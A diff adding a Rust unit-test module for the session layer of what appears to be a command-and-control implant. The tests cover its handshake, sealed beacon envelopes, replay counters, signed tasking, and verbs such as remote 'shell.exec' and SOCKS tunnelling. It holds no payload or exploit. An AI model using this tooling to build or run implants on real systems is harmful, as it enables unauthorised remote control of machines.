@@ -299,3 +299,186 @@ impl Session {
         }
     }
 }
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use crate::wire::{HandshakeRequest, HandshakeResponse, TaskResult};
+    use rsa::pkcs8::EncodePublicKey;
+    use rsa::signature::{RandomizedSigner, SignatureEncoding};
+
+    fn cadence() -> Cadence {
+        std::sync::Arc::new(std::sync::Mutex::new((30.0, 0.0)))
+    }
+
+    fn bare_session(seal: Option<Seal>) -> Session {
+        Session::new("i-1".into(), &[], cadence(), Vec::new(), seal, None, true)
+    }
+
+    fn advertised_of(session: &mut Session) -> Vec<String> {
+        HandshakeRequest::decode(session.handshake_frame().payload.as_ref())
+            .expect("the handshake decodes")
+            .capabilities
+    }
+
+    #[test]
+    fn sealed_cycles_round_trip_and_burn_a_counter_per_attempt() {
+        let mut session = bare_session(Some(Seal {
+            key_id: [0x11; 16],
+            key: [0x22; 32],
+        }));
+        let handshake = session.handshake_frame();
+        let first = session.encode_outgoing(&[handshake]).0;
+        let second = session.encode_outgoing(&[]).0;
+        // The counter burns per attempt, not per delivery, so a
+        // retransmission never trips the server's replay floor.
+        assert_ne!(first, second);
+        // The response side opens under its own purpose tag -- and refuses
+        // the request tag's bytes.
+        let inbound = crate::envelope::seal_contact_body(
+            b"",
+            &[0x11; 16],
+            &[0x22; 32],
+            crate::envelope::CONTACT_RESPONSE_AAD,
+        );
+        assert_eq!(
+            session.decode_incoming(&inbound).map(|frames| frames.len()),
+            Some(0)
+        );
+        assert_eq!(session.decode_incoming(&first), None);
+    }
+
+    #[test]
+    fn unsealed_cycles_pass_frames_through() {
+        let mut session = bare_session(None);
+        let handshake = session.handshake_frame();
+        let (body, content_type) = session.encode_outgoing(&[handshake]);
+        assert_eq!(content_type, "application/octet-stream");
+        assert_eq!(
+            session.decode_incoming(&body).map(|frames| frames.len()),
+            Some(1)
+        );
+    }
+
+    #[test]
+    fn handshake_answers_negotiate_or_refuse() {
+        let mut session = bare_session(None);
+        let answer = Frame {
+            payload: HandshakeResponse {
+                status: crate::wire::HandshakeStatus::Ok as i32,
+                replay_nonces: Some(true),
+                task_acks: Some(true),
+                ..Default::default()
+            }
+            .encode_to_vec(),
+            kind: 0,
+        };
+        let (acks, attempt) = session
+            .handshake_answered(&answer)
+            .expect("the answer reads");
+        assert!(acks);
+        assert!(matches!(attempt, Attempt::Crossed));
+        assert!(session.nonces.negotiated);
+        let refused = Frame {
+            payload: HandshakeResponse {
+                status: crate::wire::HandshakeStatus::ImplantRetired as i32,
+                ..Default::default()
+            }
+            .encode_to_vec(),
+            kind: 0,
+        };
+        let (_, attempt) = session
+            .handshake_answered(&refused)
+            .expect("the answer reads");
+        assert!(matches!(attempt, Attempt::Refused));
+        let garbage = Frame {
+            payload: vec![0xff, 0xff, 0xff, 0xff],
+            kind: 0,
+        };
+        assert!(session.handshake_answered(&garbage).is_err());
+    }
+
+    #[test]
+    fn the_advertisement_intersects_the_compiled_handlers() {
+        let baked = ["shell.exec".to_string(), "no.such.verb".to_string()];
+        let mut session = Session::new("i".into(), &baked, cadence(), Vec::new(), None, None, true);
+        assert_eq!(advertised_of(&mut session), vec!["shell.exec".to_string()]);
+    }
+
+    #[test]
+    fn poll_bakes_opt_into_the_degraded_channel_walk() {
+        let baked = ["tunnel.socks".to_string(), "shell.exec".to_string()];
+        let mut poll = Session::new("i".into(), &baked, cadence(), Vec::new(), None, None, true);
+        assert!(advertised_of(&mut poll).contains(&"channels.poll".to_string()));
+        // A stream bake must not: the park would never drain.
+        let mut stream = Session::new("i".into(), &baked, cadence(), Vec::new(), None, None, false);
+        assert!(!advertised_of(&mut stream).contains(&"channels.poll".to_string()));
+    }
+
+    #[test]
+    fn carriage_advertisements_are_idempotent() {
+        let mut session = bare_session(None);
+        session.advertise("cap.x");
+        session.advertise("cap.x");
+        let advertised = advertised_of(&mut session);
+        assert_eq!(advertised.iter().filter(|cap| *cap == "cap.x").count(), 1);
+    }
+
+    #[test]
+    fn unsigned_tasking_fails_closed_into_the_batch() {
+        let mut session = bare_session(None);
+        let task = TaskRequest {
+            task_id: "t-1".into(),
+            verb: "shell.exec".into(),
+            arguments: "id".into(),
+            ..Default::default()
+        };
+        session.accept(&task, false);
+        let batch = session.outbox.batch();
+        assert_eq!(batch.len(), 1);
+        let result = TaskResult::decode(batch[0].payload.as_ref()).expect("the result decodes");
+        assert_eq!(result.outcome, 2);
+        assert!(result.output.contains("signature"), "{}", result.output);
+    }
+
+    #[test]
+    fn nonceless_redelivery_answers_from_the_ledger_cache() {
+        let mut rng = rand::thread_rng();
+        let private = rsa::RsaPrivateKey::new(&mut rng, 2048).expect("rsa keygen");
+        let spki = private
+            .to_public_key()
+            .to_public_key_der()
+            .expect("spki der");
+        let signer = Certificate {
+            raw: Vec::new(),
+            spki: spki.as_bytes().to_vec(),
+        };
+        let mut session =
+            Session::new("i-1".into(), &[], cadence(), vec![signer], None, None, true);
+        let mut task = TaskRequest {
+            task_id: "t-1".into(),
+            verb: "no.such.verb".into(),
+            arguments: "x".into(),
+            ..Default::default()
+        };
+        let canonical =
+            crate::verify::canonical_bytes("i-1", &task.task_id, &task.verb, &task.arguments, None);
+        let signing = rsa::pss::SigningKey::<sha2::Sha256>::new(private);
+        let mut rng = rand::thread_rng();
+        task.signature = signing.sign_with_rng(&mut rng, &canonical).to_vec();
+        // First delivery: the ack, then the one dispatch's result.
+        session.accept(&task, true);
+        let first = session.outbox.batch();
+        assert_eq!(first.len(), 2, "the ack and the result");
+        let executed = TaskResult::decode(first[1].payload.as_ref()).expect("the result decodes");
+        session.outbox.batch_crossed(first.len());
+        // Redelivery: re-acked and answered from the cache, with the same
+        // output the single execution produced.
+        session.accept(&task, true);
+        let second = session.outbox.batch();
+        assert_eq!(second.len(), 2);
+        let cached = TaskResult::decode(second[1].payload.as_ref()).expect("the cached result");
+        assert_eq!(cached.task_id, executed.task_id);
+        assert_eq!(cached.output, executed.output);
+    }
+}
